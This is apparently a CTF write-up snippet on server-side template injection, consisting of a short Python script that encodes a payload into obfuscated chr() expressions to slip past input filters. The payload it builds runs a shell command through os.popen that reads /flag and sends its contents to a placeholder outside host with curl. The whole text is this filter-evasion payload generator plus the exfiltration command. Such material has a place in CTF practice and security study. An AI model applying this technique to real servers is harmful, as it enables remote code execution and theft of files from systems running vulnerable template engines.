# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ssti入门知识点.md
# TITLE: [前言](https://tttang.com/archive/1698/#toc_)
# CATEGORY: web

def aaa(t):
    t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
    return t
s='__import__("os").popen("curl http://xxx:7777?p=`cat /flag`").read()'
def ccchr(s):
    t=''
    for i in range(len(s)):
        if i<len(s)-1:
            t+='chr('+aaa(str(ord(s[i])))+')%2b'
        else:
            t+='chr('+aaa(str(ord(s[i])))+')'
    return t
print(ccchr(s))
